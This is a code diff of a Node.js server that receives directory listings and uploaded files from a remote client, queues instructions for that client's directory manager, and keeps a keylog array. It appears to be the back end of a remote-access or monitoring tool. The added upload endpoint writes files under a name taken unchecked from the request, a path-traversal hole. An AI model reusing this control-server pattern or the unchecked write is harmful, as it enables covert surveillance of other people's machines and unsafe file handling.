@@ -3,12 +3,13 @@
 const http = require('http');//needed for communication
 const https = require('https');//needed for secure communication
 const fs = require('fs');//read files
+const path = require('path');
 const port = 1999;//port for the server
 
 let keylog = [];
-let folders = {};
+let folders = { files: [], current_dir: [] };
 let mediastream
-let dirman_instruction = { action: 'do nothing', path: null };
+let dirman_instruction = undefined;
 
 //404 page goes here
 function notfoundpage(res, url) {
@@ -63,7 +64,7 @@ const server = http.createServer(function (req, res) {
 
         case '/action/get/folders'://Get folders from server
 
-            console.log('folder request: ', folders)
+            //console.log('folder request: ', folders)
             res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
             res.write(JSON.stringify(folders))
             res.end()
@@ -74,11 +75,16 @@ const server = http.createServer(function (req, res) {
 
             req.on('data', function (data) {
                 folders = JSON.parse(data)
-                console.log('folder data :', folders)
+                //console.log('folder data :', folders)
                 //respond with instruction
                 res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
-                res.end(JSON.stringify(dirman_instruction))
-                dirman_instruction = { action: 'do nothing', path: null };
+                //console.log(dirman_instruction)
+                if (dirman_instruction != undefined) {
+                    res.end(JSON.stringify(dirman_instruction))
+                } else {
+                    res.end()
+                }
+                dirman_instruction = undefined;
             });
 
             break;
@@ -90,6 +96,24 @@ const server = http.createServer(function (req, res) {
                 console.log('folder instruction data :', dirman_instruction)
                 res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
                 res.end(JSON.stringify({ server: 'instruction received' }))
+            });
+
+            break;
+
+        case '/action/post/file'://receive folder instructions from Control page
+
+            req.on('data', function (data) {
+                //console.log('file buffer posted', data);
+                var file = JSON.parse(data);
+                console.log('File data :', file)
+
+                fs.writeFile('temp/' + file.details.base, file.data.data, function (err) {//write posted file
+                    if (err) {
+                        console.warn('file error: ', err)
+                    }
+                })
+
+                res.end();
             });
 
             break;
